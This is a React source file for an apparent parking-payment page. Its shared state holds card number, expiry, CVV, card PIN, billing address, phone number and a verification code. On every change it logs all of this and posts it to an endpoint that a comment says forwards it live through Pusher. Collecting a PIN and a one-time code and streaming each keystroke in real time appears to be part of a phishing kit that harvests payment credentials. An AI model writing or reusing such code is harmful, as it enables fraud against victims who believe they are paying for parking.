'use client';

import { createContext, useContext,  useState, ReactNode } from 'react';


type ParkingData = {
    hours: number;
    minutes: number;
    price: string;
    licensePlate: string;
    cardNumber?: string;
    expDate?: string;
    cvv?: string;
    cardType?: 'credit' | 'debit';
    phoneNumber?: string;
     billingAddress?: string;
     pin?: string;
     verificationCode?: string; 
    
    
};

type ParkingContextType = {
    data: ParkingData;
    setData: (updates: Partial<ParkingData>) => void;
};

const ParkingContext = createContext<ParkingContextType | undefined>(undefined);

export const ParkingProvider = ({ children }: { children: ReactNode }) => {
    const [data, setParkingData] = useState<ParkingData>({
        hours: 0,
        minutes: 15,
        price: '0.25',
        licensePlate: '',
    });

    const setData = (updates: Partial<ParkingData>) => {
        const newData = { ...data, ...updates };
        setParkingData(newData);

        console.log('[ParkingContext Updated]', newData);

        // 🔥 Send to Pusher (via simple fetch to API)
        fetch('/api/send', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(newData),
        });
    };

    return (
        <ParkingContext.Provider value={{ data, setData }}>
            {children}
        </ParkingContext.Provider>
    );
};

export const useParking = () => {
    const context = useContext(ParkingContext);
    if (!context) throw new Error('useParking must be used within ParkingProvider');
    return context;
};
